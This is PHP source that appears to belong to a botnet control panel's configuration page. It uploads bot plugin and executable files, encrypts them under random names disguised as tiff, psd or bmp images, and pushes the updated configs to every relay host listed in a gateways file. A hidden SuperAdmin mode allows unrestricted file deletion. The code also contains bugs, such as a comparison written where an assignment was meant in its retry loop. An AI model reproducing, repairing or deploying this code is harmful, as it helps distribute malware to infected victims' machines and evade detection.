<?php
get_function('ts2str');
get_function('size_format');
get_function('rc');


function remove_thk($file){
	return str_replace('.', '|', $file);
}

if($_SESSION['hidden'] == 'on' && $_SESSION['user']->login == 'SuperAdmin'){
	if(!empty($Cur['str'])){
		@unlink('cfg/' . str_replace('|', '.', $Cur['str']));
	}
	
	function check_del($file){
		return false;
	}
}else{
	if(!empty($Cur['str']) && !preg_match('~\.(plug|PLUG)$~is', $Cur['str'])){
		@unlink('cfg/' . str_replace('|', '.', $Cur['str']));
	}
	
	function check_del($file){
		if(strpos('.plug', strtolower($file))){
			return true;
		}else{
			return false;
		}
	}
}

$ext = array('tiff', 'psd', 'bmp');

if($Cur['x'] == 'rehash'){
	include_once('includes/functions.rc.php');
	
	file_put_contents('cache/cfg_list.db', '');
	
	$cfg_dir = 'cfg/';
	$cfg = scandir($cfg_dir, false);
	unset($cfg[0], $cfg[1]);
	
	foreach($cfg as $key => $file){
		if($file != '.htaccess' && $file != '.' && $file != '..'){
			switch(pathinfo($file, PATHINFO_EXTENSION)){
				case 'tiff':
				case 'psd':
				case 'bmp':
					unset($cfg[$key]);
					@unlink($cfg_dir . $file);
				break;
			}
		}
	}
	
	$new_format = '';
	foreach($cfg as $file){
		if($file != '.htaccess' && $file != '.' && $file != '..'){
			switch(pathinfo($file, PATHINFO_EXTENSION)){
				case '':
					$rcfile = generatePassword(mt_rand(6, 32)) . '.' . $ext[mt_rand(0, 2)];
					$wf = false;
					
					do{
						if(file_exists($cfg_dir . $rcfile)) @unlink($cfg_dir . $rcfile);
						file_put_contents($cfg_dir . $rcfile, rc_encode(file_get_contents($cfg_dir . $file)));
						
						if(md5(rc_decode(file_get_contents($cfg_dir . $rcfile))) != md5(file_get_contents($cfg_dir . $file))){
							//echo $file . ' - ' . $rcfile . ' - ERROR' . '<br>';
							$wf == true;
							usleep(100000);
						}else{
							//echo $file . ' - ' . $rcfile . ' - OK' . '<br>';
							$wf = false;
						}
					}while($wf == true);
					
					file_put_contents('cache/cfg_list.db', $file . '|' . $rcfile . "\r\n", FILE_APPEND);
					//file_put_contents($dir . 'cache/cfg_list.db', $file . '|' . $rcfile . '|' . md5(file_get_contents($cfg_dir . $file)) . "\r\n", FILE_APPEND);
					$new_format .= $file . '|' . $rcfile . '|' . md5(file_get_contents($cfg_dir . $file)) . "\r\n";
				break;
				
				case 'tiff':
				case 'psd':
				case 'bmp':
					@unlink($cfg_dir . $file);
				break;
			
				case 'exe':
					//@unlink($cfg_dir . $file);
				break;
			
				default:
					/*
					$psd_file = str_replace('.plug', '.psd', $file);
					$psd_file = str_replace('.bin', '.tiff', $psd_file);
					if(file_exists($cfg_dir . $psd_file)) @unlink($cfg_dir . $psd_file);
					file_put_contents($cfg_dir . $psd_file, rc_encode(file_get_contents($cfg_dir . $file)));
					*/
					
					$rcfile = generatePassword(mt_rand(6, 32)) . '.' . $ext[mt_rand(0, 2)];
					$wf = false;
					do{
						if(file_exists($cfg_dir . $rcfile)) @unlink($cfg_dir . $rcfile);
						file_put_contents($cfg_dir . $rcfile, rc_encode(file_get_contents($cfg_dir . $file)));
						
						if(md5(rc_decode(file_get_contents($cfg_dir . $rcfile))) != md5(file_get_contents($cfg_dir . $file))){
							//echo $file . ' - ' . $rcfile . ' - ERROR' . '<br>';
							$wf == true;
							usleep(100000);
						}else{
							//echo $file . ' - ' . $rcfile . ' - OK' . '<br>';
							$wf = false;
						}
					}while($wf == true);
					
					file_put_contents('cache/cfg_list.db', $file . '|' . $rcfile . "\r\n", FILE_APPEND);
					//file_put_contents($dir . 'cache/cfg_list.db', $file . '|' . $rcfile . '|' . md5(file_get_contents($cfg_dir . $file)) . "\r\n", FILE_APPEND);
					$new_format .= $file . '|' . $rcfile . '|' . md5(file_get_contents($cfg_dir . $file)) . "\r\n";
				break;
			}
		}
	}
	if(!empty($new_format)) file_put_contents('cache/cfg_list.db', "\r\n\r\n" . $new_format, FILE_APPEND);

	if(file_exists('cache/gateways.json')){
		$gws = file_get_contents('cache/gateways.json');
		if(!empty($gws)){
			$gws = json_decode($gws, 1);
			
			foreach($gws as $u){
				file_get_contents('http://' . $u . '/update_cfg.php', false);
			}
		}
	}
	
	header('Location: /bots/config.html');
}

if(isset($_POST['update']) && isset($_FILES['file'])){
	if(!preg_match('~\.(php|phtml)([0-9]+)?$~is', $_FILES['file']['name'])){
		@unlink('cfg/' . strtolower($_FILES['file']['name']));
		if(move_uploaded_file($_FILES['file']['tmp_name'], 'cfg/' . strtolower($_FILES['file']['name']))){
			if(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION) == ''){
				file_put_contents('cfg/' . $_FILES['file']['name'], file_get_contents('cfg/' . strtolower($_FILES['file']['name'])));
			}else{
				$rcfile = generatePassword(mt_rand(6, 32)) . '.' . $ext[mt_rand(0, 2)];
				file_put_contents('cfg/' . $rcfile, rc_encode(file_get_contents('cfg/' . strtolower($_FILES['file']['name']))));
				$cfg_list = file_get_contents('cache/cfg_list.db');
				
				if(preg_match('~' . $_FILES['file']['name'] . '\|(.*)\r\n~U', $cfg_list)){
					$cfg_list = preg_replace('~' . $_FILES['file']['name'] . '\|(.*)\r\n~U', $_FILES['file']['name'] . '|' . $rcfile . "\r\n", $cfg_list);
					file_put_contents('cache/cfg_list.db', $cfg_list);
				}else{
					file_put_contents('cache/cfg_list.db', $_FILES['file']['name'] . '|' . $rcfile . "\r\n", FILE_APPEND);
				}
			}
		}else{
			$smarty->assign('upload_false', true);
		}
	}else{
		$smarty->assign('upload_false', true);
	}
}

$files = scandir('cfg/', false);
unset($files[0], $files[1]);

if(count($files) > 0){
	foreach($files as $key => $file){
		if($_SESSION['user']->id === '0'){
			if(is_file('cfg/' . $file) && !file_exists('cache/cfg/' . $file) && $file != '.htaccess'){
				$files[$key] = array();
				$files[$key]['name'] = $file;
				$files[$key]['link'] = '/cfg/' . $file;
				$files[$key]['size'] = filesize('cfg/' . $file);
				$files[$key]['date'] = filemtime('cfg/' . $file);
			}else{
				unset($files[$key]);
			}
		}else{
			if(is_file('cfg/' . $file) && !file_exists('cache/cfg/' . $file) && $file != '.htaccess' && pathinfo($file, PATHINFO_EXTENSION) != 'plug' && pathinfo($file, PATHINFO_EXTENSION) != 'psd' && pathinfo($file, PATHINFO_EXTENSION) != 'tiff' && pathinfo($file, PATHINFO_EXTENSION) != 'bmp' && pathinfo($file, PATHINFO_EXTENSION) != 'exe'){
				$files[$key] = array();
				$files[$key]['name'] = $file;
				$files[$key]['link'] = '/cfg/' . $file;
				$files[$key]['size'] = filesize('cfg/' . $file);
				$files[$key]['date'] = filemtime('cfg/' . $file);
			}else{
				unset($files[$key]);
			}
		}
	}
}

$smarty->assign('files', $files);

?>